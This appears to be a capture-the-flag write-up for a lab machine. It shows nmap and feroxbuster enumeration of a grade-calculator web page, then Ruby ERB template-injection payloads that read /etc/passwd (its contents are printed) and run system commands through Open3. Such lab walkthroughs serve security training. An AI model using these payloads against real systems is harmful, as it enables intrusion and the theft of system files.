### Nmap scan

The IP has 2 ports open

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.9p1: 
|_      CVE-2023-51767  3.5     https://vulners.com/cve/CVE-2023-51767
80/tcp open  http    syn-ack ttl 63 nginx
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.11.253
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.11.253:80/weighted-grade
|     Form id: category1
|_    Form action: /weighted-grade-calc
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking the website

![image](https://github.com/L43371/Write-up/assets/129752764/04f950db-94c9-4e9e-8928-cb2d5e412ab0)

### Feroxbuster

```
200      GET        6l       12w      142c http://10.10.11.253/css/lato.css
200      GET        6l       12w      173c http://10.10.11.253/css/montserrat.css
200      GET      103l      387w     3827c http://10.10.11.253/about
200      GET      142l      444w     5191c http://10.10.11.253/weighted-grade
200      GET       32l      220w    13738c http://10.10.11.253/images/checklist.jpg
200      GET       11l       52w     3860c http://10.10.11.253/images/lightning.png
200      GET      235l      442w    23427c http://10.10.11.253/css/w3.css
200      GET        4l       66w    31000c http://10.10.11.253/css/font-awesome.min.css
200      GET      101l      390w     3842c http://10.10.11.253/
200      GET       51l      214w    14842c http://10.10.11.253/images/susan.jpg
200      GET      176l     1024w    79295c http://10.10.11.253/images/tina.jpg
```

There is no interesting directory

Visiting `/weighted-grade` , this may be an interesting page

![image](https://github.com/L43371/Write-up/assets/129752764/6115194d-2acf-46e6-9f63-5e633c54a133)

Intercepting the traffic using Caido

![image](https://github.com/L43371/Write-up/assets/129752764/f38d12c6-26cc-428d-861c-5794394b57e4)

## SSTI attack

Payload that I am using is `<%= File.open('/etc/passwd').read %>`
![image](https://github.com/L43371/Write-up/assets/129752764/e7f37447-34e7-4597-8872-7feb8a0a6868)

![image](https://github.com/L43371/Write-up/assets/129752764/001c8715-925d-4e67-914c-8257c1edbd9f)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
susan:x:1001:1001:Susan Miller,,,:/home/susan:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

![image](https://github.com/L43371/Write-up/assets/129752764/6fc21c0a-f499-4323-a13a-7980b66929c4)

Using this exploit `<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>` we are able to issue a command and by using a payload that is URL encoded, we can get a shell 

![image](https://github.com/L43371/Write-up/assets/129752764/bf6ef03b-8a97-46f3-af3b-4bbf6e24da9e)

![image](https://github.com/L43371/Write-up/assets/129752764/3d78b4ca-707d-4c48-96dd-76f8e4542dfb)

![image](https://github.com/L43371/Write-up/assets/129752764/c45495f7-fce5-4c6a-9dde-439a74c66b44)






